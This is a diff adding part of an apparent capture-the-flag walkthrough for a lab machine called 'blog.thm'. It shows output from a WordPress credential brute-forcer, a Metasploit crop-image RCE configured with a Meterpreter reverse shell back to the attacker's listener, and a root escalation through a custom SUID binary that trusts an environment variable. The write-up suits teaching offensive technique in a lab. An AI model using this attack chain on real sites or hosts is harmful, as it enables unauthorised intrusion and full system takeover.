@@ -238,3 +238,216 @@ for p in passwords:
 ```
 
 We run it.
+
+And after a long, long time, we get the result. I'll make it threaded next time lol.
+
+```
+python3 bruteforcer.py
+Cookies set successfully.
+Valid credentials found: kwheel:****
+```
+
+And with the login credentials available, we can use the metasploit module to gain access to the computer. We set the options as such.
+
+```
+msf6 exploit(multi/http/wp_crop_rce) > show options
+
+Module options (exploit/multi/http/wp_crop_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD   ********         yes       The WordPress password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:
+                                         port][...]
+   RHOSTS     http://blog.thm  yes       The target host(s), see https://docs.metasploit.co
+                                         m/docs/using-metasploit/basics/using-metasploit.ht
+                                         ml
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       The base path to the wordpress application
+   THEME_DIR                   no        The WordPress theme dir name (disable theme auto-d
+                                         etection if provided)
+   USERNAME   kwheel           yes       The WordPress username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.6.69.50       yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   WordPress
+```
+We run.
+
+```
+msf6 exploit(multi/http/wp_crop_rce) > exploit
+
+[*] Started reverse TCP handler on 10.6.69.50:4444 
+[*] Authenticating with WordPress using kwheel:*****...
+[+] Authenticated with WordPress
+[*] Preparing payload...
+[*] Uploading payload
+[+] Image uploaded
+[*] Including into theme
+[*] Sending stage (39927 bytes) to 10.10.21.52
+[*] Meterpreter session 1 opened (10.6.69.50:4444 -> 10.10.21.52:41962) at 2024-01-05 23:22:43 +0000
+[*] Attempting to clean up files...
+
+meterpreter >
+```
+And voila! We're in!
+
+## Phase 2: PrivEsc to root.
+
+Priv esc in this machine was pretty straight forward.
+We run the following command in order to list SUID/SGIDs in the system.
+
+```
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
+-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
+-rwxr-sr-x 1 root shadow 71816 Mar 22  2019 /usr/bin/chage
+-rwxr-sr-x 1 root tty 14328 Jan 17  2018 /usr/bin/bsd-write
+-rwxr-sr-x 1 root mlocate 43088 Mar  1  2018 /usr/bin/mlocate
+-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
+-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newuidmap
+-rwxr-sr-x 1 root crontab 39352 Nov 16  2017 /usr/bin/crontab
+-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
+-rwxr-sr-x 1 root ssh 362640 Mar  4  2019 /usr/bin/ssh-agent
+-rwxr-sr-x 1 root shadow 22808 Mar 22  2019 /usr/bin/expiry
+-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
+-rwxr-sr-x 1 root tty 30800 Mar  5  2020 /usr/bin/wall
+-rwsr-xr-x 1 root root 149080 Jan 31  2020 /usr/bin/sudo
+-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
+-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newgidmap
+-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
+-rwsr-sr-x 1 root root 8432 May 26  2020 /usr/sbin/checker
+```
+
+On that last line, we can see a checker app, which is not a usual SUID app. Let's test it out see what it does.
+
+```
+checker
+Not an Admin
+```
+Just not an admin? Lets analyze further.
+
+```
+strings /usr/sbin/checker
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+setuid
+puts
+getenv
+system
+__cxa_finalize
+__libc_start_main
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+=9	
+AWAVI
+AUATL
+[]A\A]A^A_
+admin
+/bin/bash
+Not an Admin
+;*3$"
+GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.7698
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+checker.c
+__FRAME_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+getenv@@GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+puts@@GLIBC_2.2.5
+_edata
+system@@GLIBC_2.2.5
+__libc_start_main@@GLIBC_2.2.5
+__data_start
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+__bss_start
+main
+__TMC_END__
+_ITM_registerTMCloneTable
+setuid@@GLIBC_2.2.5
+__cxa_finalize@@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.ABI-tag
+.note.gnu.build-id
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.data
+.bss
+.comment
+```
+Analyzing the strings of the binary, we can see it has a setuid command. So maybe it sets a different uid if it determines we are an admin? We get no mention of the validation method though. Let's ltrace see if we can get any information.
+
+```
+ltrace checker
+getenv("admin")                                  = nil
+puts("Not an Admin")                             = 13
+Not an Admin
++++ exited (status 0) +++
+```
+
+Getenv admin? Wait, don't tell me...
+
+```
+export admin=qwdqwdqwd
+echo $admin
+qwdqwdqwd
+checker
+
+id
+uid=0(root) gid=33(www-data) groups=33(www-data)
+export admin=
+echo $admin 
+
+checker
+id
+uid=0(root) gid=33(www-data) groups=33(www-data)
+```
+So, basically, it checks if the admin environment variable exists, and if it does, it changes the uid to 0, making us root. And thus, we are root!
